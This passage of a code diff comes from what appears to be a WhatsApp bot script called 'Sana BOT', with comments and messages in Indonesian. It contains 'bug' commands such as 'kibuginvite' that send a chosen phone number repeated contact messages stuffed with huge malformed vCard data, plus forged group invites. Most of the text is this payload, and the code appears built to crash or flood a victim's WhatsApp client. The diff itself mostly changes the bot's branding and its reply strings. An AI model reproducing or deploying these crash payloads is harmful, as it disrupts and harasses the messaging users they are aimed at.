karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+let farizcoli = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./pict.jpg') }, { upload: jobotz.waUploadToServer })
 var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,
-"groupName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,
+"inviteExpiration": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,
+"groupName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,
 "caption": `${philips}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -7551,18 +7616,18 @@ await m.reply(`Berhasil Mengirim Buginvite Di Nomer ${text}`)
 }
 break
 case 'kibuginvite': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-let farizcoli = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 